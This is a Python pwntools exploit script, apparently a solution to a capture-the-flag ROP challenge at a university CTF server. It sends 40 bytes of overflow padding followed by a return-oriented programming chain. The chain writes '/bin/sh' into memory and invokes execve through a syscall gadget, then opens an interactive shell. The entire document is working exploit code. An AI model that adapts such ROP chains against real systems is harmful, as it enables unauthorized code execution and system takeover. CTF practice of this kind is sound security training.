# -*- coding: utf-8 -*-
from pwn import *
context.arch = "amd64"

host, port = 'ctf.adl.csie.ncu.edu.tw', 11005
p = remote(host, port)
#p = process('./rop')

payload = "a"*40

# write /bin/sh
mov_prdi_rdx = 0x0000000000400aba
pop_rdi = 0x0000000000401693
pop_rdx = 0x00000000004371d5 
buf = 0x6c0060

# syscall
pop_rax = 0x000000000046b408
pop_rsi = 0x00000000004017a7
syscall = 0x000000000045b4c5

# combine
rop = flat([
    pop_rdi, buf, pop_rdx, "/bin/sh\x00", mov_prdi_rdx,
    pop_rax, 0x3b, pop_rsi, 0, pop_rdx, 0,
    syscall
])

p.recvuntil("ROP attack is easy, isn't it? Show me your skill.")
p.sendline(payload + rop)
p.interactive()
